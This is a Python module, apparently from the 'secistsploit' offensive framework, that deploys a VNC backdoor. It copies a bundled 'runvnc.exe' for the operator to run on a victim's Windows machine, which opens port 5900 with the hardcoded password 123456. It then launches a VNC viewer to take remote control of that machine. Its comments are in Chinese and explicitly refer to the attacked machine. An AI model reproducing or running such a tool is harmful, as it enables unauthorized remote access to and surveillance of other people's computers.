# -*- coding: UTF-8 -*-
import os,sys,shutil
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


platform=sys.platform   #判断获取操作系统

if  platform == "darwin":
    path=os.getcwd()+'/secistsploit/data/windows/vnc/vncviewer_linux'
elif platform == "linux":
    path=os.getcwd()+'/secistsploit/data/windows/vnc/vncviewer_linux'
elif platform == "windows":
    path=os.getcwd()+'/secistsploit/data/windows/vnc/vncviewer_win.exe'
class Exploit(TCPClient):
    __info__ = {
        "name": "connection_vnc",
        "\033[91m内容描述\033[0m": "connection模块叙述：\n"
                        "1.runvnc.exe 运行后会启动vnc默认5900端口支持x64 x86\n",
						"2.连接密码是123456 \n"
        "\033[91m参考链接\033[0m": (
             " \n"
        ),

        "\033[91m作者\033[0m": (
            "WBGlIl",
        ),
    }

    rhost = OptIP("", "远程目标IP地址")
    target = OptString("Windows")
    rport= OptPort("5900","port")



    def run(self):
        RHOST=(self.rhost)
        TARGET=(self.target)
        RPORT=(self.rport)
        ip = " "+RHOST+":"


        if  TARGET == "Windows":
            file=os.getcwd()+'/secistsploit/data/windows/vnc/runvnc.exe'
            shutil.copy(file,os.getcwd())
            print ("\033[92m[+]\033[0m  客户端输出路径:  "+os.getcwd()+"/runvnc.exe \n")

        yes= input("\033[94m[*]\033[0m  如果已经执行客户端请输入yes:  ")
        if yes =="yes":
            runvnc=path+ip+str(RPORT)
            os.system(runvnc)
        else:
            print ("请在被攻击者机器上执行客户端程序")
